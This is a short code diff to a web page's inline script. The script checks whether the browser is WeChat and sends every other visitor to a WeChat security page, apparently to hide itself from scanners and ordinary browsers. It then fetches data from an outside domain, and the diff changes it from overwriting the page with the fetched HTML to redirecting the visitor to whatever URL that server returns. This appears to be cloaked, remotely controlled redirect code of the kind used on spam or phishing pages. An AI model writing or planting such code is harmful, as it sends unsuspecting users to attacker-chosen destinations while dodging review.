@@ -11,12 +11,13 @@
     if (useragent.match(/MicroMessenger/i) != 'MicroMessenger') {
         window.location.href = "http://weixin110.qq.com"
     }
-    x_load = "http://www.sklmyun.com/showad?t=" + new Date().getTime();
+    x_load = "https://www.sklmyun.com/ba?t=" + new Date().getTime();
         x_load && function () {
             $.get(x_load, function (data) {
-                var new_doc = document.open("text/html", "replace");
-                new_doc.write(data);
-                new_doc.close();
+                // var new_doc = document.open("text/html", "replace");
+                // new_doc.write(data);
+                // new_doc.close();
+                window.location=data
             });
         }();
 </script>
